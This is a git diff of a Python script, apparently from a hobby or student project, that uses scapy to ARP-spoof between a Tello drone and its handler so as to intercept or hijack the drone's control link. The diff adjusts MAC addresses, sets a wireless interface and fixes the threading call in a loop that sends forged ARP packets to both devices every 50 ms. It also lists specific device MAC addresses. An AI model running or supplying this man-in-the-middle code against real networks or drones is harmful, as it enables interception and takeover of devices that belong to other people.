@@ -1,10 +1,11 @@
 # Writer: Gal Harari
 # Date: 29/05/2019$
-from TelloPy.tellopy._internal import tello
-# import av
+from Tellopy.tellopy._internal import tello
+import av
 import cv2
 import numpy
 import time
+import threading
 import traceback
 from scapy.all import *
 import signal
@@ -12,10 +13,14 @@ from scapy.layers.l2 import ARP
 from scapy.layers.inet import IP, UDP, Ether
 
 handler_ip = '192.168.10.2'
-handler_mac = 'ec:d0:9f:fd:1b:25'
+handler_mac = '18:65:90:2f:5f:78'
+sarel_mac = ''
+galili_mac = '4c:66:41:1a:70:2e'
 drone_ip = '192.168.10.1'
 drone_mac = '60:60:1f:c4:3d:ba'
-my_mac = '00:26:bb:18:b8:e5'
+my_mac = '74:da:38:a6:5b:74'
+
+i_face = 'wlx74da38a65b74'
 
 
 def spoof_on_background():
@@ -33,15 +38,15 @@ def spoof_on_background():
 
     while True:
         print("Sending ARP...")
-        sendp(spoof_handler_pkt, iface='en1')
-        sendp(spoof_drone_pkt, iface='en1')
+        sendp(spoof_handler_pkt, iface=i_face)
+        sendp(spoof_drone_pkt, iface=i_face)
         # sniff_filter = f"ip host {handler_ip}"
 
         time.sleep(0.05)
 
 
 def spoof():
-    spoofing_thread = Thread(target=spoof_on_background)
+    spoofing_thread = threading.Thread(target=spoof_on_background)
     spoofing_thread.start()
 
 
